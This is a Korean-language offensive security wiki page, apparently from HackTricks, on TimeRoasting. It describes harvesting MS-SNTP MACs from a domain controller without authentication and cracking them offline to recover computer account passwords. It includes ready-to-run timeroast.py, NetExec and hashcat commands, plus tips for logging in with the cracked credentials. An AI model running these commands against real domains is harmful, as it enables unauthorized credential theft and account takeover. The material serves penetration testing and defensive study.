# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting은 레거시 MS-SNTP 인증 확장을 악용합니다. MS-SNTP에서 클라이언트는 임의의 컴퓨터 계정 RID를 포함한 68바이트 요청을 보낼 수 있으며, 도메인 컨트롤러는 응답에 대한 MAC을 계산하기 위해 해당 컴퓨터 계정의 NTLM 해시(MD4)를 키로 사용하고 이를 반환합니다. 공격자는 인증 없이 이러한 MS-SNTP MAC을 수집해 오프라인으로 크랙(Hashcat mode 31300)하여 컴퓨터 계정 비밀번호를 복구할 수 있습니다.

자세한 내용은 공식 MS-SNTP 규격의 섹션 3.1.5.1 "Authentication Request Behavior" 및 4 "Protocol Examples"를 참조하세요.
![](../../images/Pasted%20image%2020250709114508.png)
ExtendedAuthenticatorSupported ADM 요소가 false이면, 클라이언트는 68바이트 요청을 전송하고 authenticator의 Key Identifier 하위필드의 최하위 31비트에 RID를 기록합니다.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

섹션 4 (Protocol Examples)에서:

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

crypto-checksum은 MD5 기반(섹션 3.2.5.1.1 참조)이며 오프라인으로 크랙할 수 있어 roasting 공격을 가능하게 합니다.

## 공격 방법

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting 스크립트 by Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat를 이용한 실전 공격(인증 없음)

- NetExec는 인증 없이 컴퓨터 RIDs에 대한 MS-SNTP MAC을 열거하고 수집하여 크래킹 준비된 $sntp-ms$ 해시를 출력할 수 있습니다:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- 오프라인에서 Crack을 Hashcat mode 31300 (MS-SNTP MAC)으로 수행:
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 복구된 평문은 컴퓨터 계정 암호에 해당합니다. NTLM이 비활성화된 경우 Kerberos (-k)를 사용하여 컴퓨터 계정으로 직접 시도하세요:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
운영 팁
- Kerberos 전에 정확한 시간 동기화가 되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`
- 필요한 경우 AD realm용 krb5.conf를 생성하세요: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 인증된 foothold를 확보한 후 LDAP/BloodHound를 통해 RIDs를 principals에 매핑하세요.

## References

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
